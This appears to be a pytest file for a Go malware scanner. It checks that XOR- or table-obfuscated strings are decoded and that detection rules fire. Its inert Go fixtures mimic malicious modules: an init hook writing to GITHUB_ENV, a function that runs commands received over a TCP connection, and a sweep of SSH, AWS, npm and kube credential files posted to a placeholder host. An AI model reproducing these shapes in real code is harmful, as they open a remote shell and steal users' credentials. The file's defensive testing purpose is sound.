"""Strings a Go file builds at run time, worked out statically (`detect/go_eval.py`, review 98).

The fixtures carry harmless text: what is tested is that a value hidden in a table of characters
or an XOR-encoded byte slice is written out where the code uses it.
"""

from __future__ import annotations

from cordon_scanner.analysis.go.go_eval import GoEval


class Encoded:
    @staticmethod
    def xor(text: str, key: bytes) -> str:
        data = bytes(b ^ key[i % len(key)] for i, b in enumerate(text.encode()))
        return ", ".join(f"0x{b:02x}" for b in data)


class TestATableOfCharacters:
    SOURCE = (
        "package x\n\n"
        'import "os/exec"\n\n'
        "func run() {\n"
        '\tt := []string{"e", "c", "h", "o", " ", "h", "i"}\n'
        '\tsh := "/bin/sh"\n'
        '\tflag := "-c"\n'
        "\tcmd := t[0] + t[1] + t[2] + t[3] + t[4] + t[5] + t[6]\n"
        "\texec.Command(sh, flag, cmd).Start()\n"
        "}\n"
    )

    def test_the_command_reads_as_what_it_adds_up_to(self):
        view = GoEval.resolve(self.SOURCE)
        assert 'exec.Command("/bin/sh", "-c", "echo hi")' in view

    def test_lines_are_kept(self):
        assert GoEval.resolve(self.SOURCE).count("\n") == self.SOURCE.count("\n")

    def test_a_join_over_the_table(self):
        source = 'package x\nvar t = []string{"a", "b"}\nvar s = strings.Join(t, "-")\n'
        assert GoEval.values(source)[0]["s"] == "a-b"


class TestAnXorEncodedSlice:
    def test_a_path_decoded_where_it_is_read(self):
        key = b"k3y"
        source = (
            "package x\n\n"
            'var _k = []byte("k3y")\n'
            f"var _p = []byte{{{Encoded.xor('.config/demo.txt', key)}}}\n\n"
            "func _d(enc []byte) string {\n"
            "\tout := make([]byte, len(enc))\n"
            "\tfor i, b := range enc {\n"
            "\t\tout[i] = b ^ _k[i%len(_k)]\n"
            "\t}\n"
            "\treturn string(out)\n"
            "}\n\n"
            "func init() { _ = read(_d(_p)) }\n"
        )
        assert '_d(_p) = ".config/demo.txt"' in GoEval.resolve(source)

    def test_a_legacy_octal_byte_neither_fails_nor_hides_the_slice(self):
        """Go reads `05` as octal; `int("05", 0)` refused it, and the capability detector failed on
        the whole file (a real module's `utils/encrypt.go`)."""
        key = b"k3y"
        data = bytes(b ^ key[i % len(key)] for i, b in enumerate(b".config/demo.txt"))
        items = ", ".join(f"0{b:o}" if i == 0 else f"0x{b:02x}" for i, b in enumerate(data))
        source = (
            "package x\n\n"
            'var _k = []byte("k3y")\n'
            f"var _p = []byte{{{items}}}\n\n"
            "func _d(enc []byte) string {\n"
            "\tout := make([]byte, len(enc))\n"
            "\tfor i, b := range enc {\n"
            "\t\tout[i] = b ^ _k[i%len(_k)]\n"
            "\t}\n"
            "\treturn string(out)\n"
            "}\n\n"
            "func init() { _ = read(_d(_p)) }\n"
        )
        assert '_d(_p) = ".config/demo.txt"' in GoEval.resolve(source)


class TestWhatIsLeftAlone:
    def test_literals_already_readable_add_nothing(self):
        source = 'package x\nvar greeting = "hello, " + "world"\nfunc f() { println(greeting) }\n'
        assert GoEval.resolve(source) == source


class TestGoDetections:
    """Each Go shape the 2025 malicious modules used, as minimal inert fixtures."""

    @staticmethod
    def rules(path: str, text: str) -> set[str]:
        from cordon_scanner.detect.base import FileUnit, ScanContext
        from cordon_scanner.detect.code.capability import CapabilityDetector
        from cordon_scanner.foundation.config import Config
        from cordon_scanner.foundation.content import FileContent
        from cordon_scanner.rules.loader import RuleLoader, RuleSet

        unit = FileUnit(content=FileContent.from_bytes(path, text.encode()), language="go")
        ctx = ScanContext(config=Config.default(), rules=RuleSet(RuleLoader.load_builtin()))
        return {f.rule_id for f in CapabilityDetector().inspect(unit, ctx)}

    def test_the_ci_environment_written_from_init(self):
        source = (
            "package x\n\n"
            'import "os"\n\n'
            "func _env(a, b string) string { return os.Getenv(a + b) }\n\n"
            "func init() { setup() }\n\n"
            "func setup() {\n"
            '\tpath := _env("GITHUB_", "ENV")\n'
            "\tf, _ := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)\n"
            "\tf.Close()\n"
            "}\n"
        )
        assert "SUSPECT.CI.ENVIRONMENT_INJECTION.001" in self.rules("x.go", source)

    def test_an_action_writing_it_from_main_is_not(self):
        source = (
            "package main\n\n"
            'import "os"\n\n'
            "func main() {\n"
            '\tf, _ := os.OpenFile(os.Getenv("GITHUB_ENV"), os.O_APPEND|os.O_WRONLY, 0600)\n'
            "\tf.Close()\n"
            "}\n"
        )
        assert "SUSPECT.CI.ENVIRONMENT_INJECTION.001" not in self.rules("main.go", source)

    def test_what_arrives_on_a_connection_run_in_an_indented_function(self):
        source = (
            "package x\n\n"
            "\tfunc Start() {\n"
            "\t\td := net.Dialer{}\n"
            '\t\tconn, _ := d.Dial("tcp", "127.0.0.1:9")\n'
            "\t\tline, _ := bufio.NewReader(conn).ReadString('\\n')\n"
            "\t\targs := strings.Fields(line)\n"
            "\t\tout, _ := exec.Command(args[0], args[1:]...).Output()\n"
            "\t\tconn.Write(out)\n"
            "\t}\n"
        )
        assert "SUSPECT.DROPPER.001" in self.rules("db.go", source)

    def test_many_services_credential_stores_and_a_request(self):
        source = (
            "package x\n\n"
            'var files = []string{".ssh/id_rsa", ".aws/credentials", ".npmrc", ".kube/config"}\n\n'
            "func send(b []byte) {\n"
            '\thttp.Post("https://example.invalid/c", "text/plain", bytes.NewReader(b))\n'
            "}\n"
        )
        assert "SUSPECT.EXFIL.CREDENTIAL_SWEEP.001" in self.rules("x.go", source)

    def test_one_services_own_store_is_not_a_sweep(self):
        source = (
            "package x\n\n"
            'var file = ".aws/credentials"\n\n'
            "func call() {\n"
            '\thttp.Get("https://sts.example.invalid/")\n'
            "}\n"
        )
        assert "SUSPECT.EXFIL.CREDENTIAL_SWEEP.001" not in self.rules("x.go", source)
